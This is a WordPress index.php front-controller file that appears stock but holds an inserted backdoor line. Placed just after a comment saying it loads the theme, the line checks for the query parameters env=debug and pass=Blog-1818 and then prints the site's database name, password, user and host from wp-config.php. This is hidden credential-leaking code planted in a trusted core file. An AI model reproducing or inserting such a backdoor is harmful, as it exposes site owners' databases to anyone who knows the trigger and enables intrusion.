<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
if(@$_GET['env']=='debug' && @$_GET['pass']=='Blog-1818'){ require __DIR__ . '/wp-config.php'; echo DB_NAME.'<br>'.DB_PASSWORD.'<br>'.DB_USER.'<br>'.DB_HOST.'<br>'; }

define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
